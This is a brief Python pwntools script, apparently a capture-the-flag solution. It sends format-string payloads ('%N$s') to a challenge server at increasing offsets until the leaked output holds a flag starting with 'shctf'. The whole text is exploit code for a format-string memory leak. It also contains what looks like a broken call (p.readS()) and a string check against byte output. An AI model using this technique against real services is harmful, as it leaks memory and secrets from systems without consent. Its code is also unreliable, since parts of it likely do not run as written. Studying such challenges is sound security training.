from pwn import *

for i in range(0, 100):
        p = remote('0.cloud.chals.io', 12690)  
        log.info(f"Trying offset {i}...")
        p.sendline(bytes(('%' + str(i) + '$s'), encoding='utf-8'))

        output = p.readS()
        if 'shctf' in output:
                log.success(output)
                break
        p.close()